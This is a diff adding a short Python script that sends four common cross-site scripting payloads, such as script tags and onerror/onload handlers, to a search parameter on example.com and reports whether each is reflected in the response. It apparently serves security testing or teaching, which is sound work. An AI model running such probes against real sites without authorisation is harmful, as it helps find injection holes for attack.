@@ -1,0 +1,28 @@
+import requests
+
+# Define the URL and the parameter to test for XSS
+url = "http://example.com/search"
+param = "q"
+
+# List of common XSS payloads
+payloads = [
+    "<script>alert('XSS');</script>",
+    "<img src='x' onerror='alert(1)'>",
+    "<svg onload='alert(1)'>",
+    "><script>alert(1)</script>"
+]
+
+def test_xss(url, param, payloads):
+    for payload in payloads:
+        # Send the request with the payload
+        params = {param: payload}
+        response = requests.get(url, params=params)
+
+        # Check if the payload is reflected in the response
+        if payload in response.text:
+            print(f"Potential XSS vulnerability found with payload: {payload}")
+        else:
+            print(f"Payload not reflected: {payload}")
+
+# Run the XSS test
+test_xss(url, param, payloads)
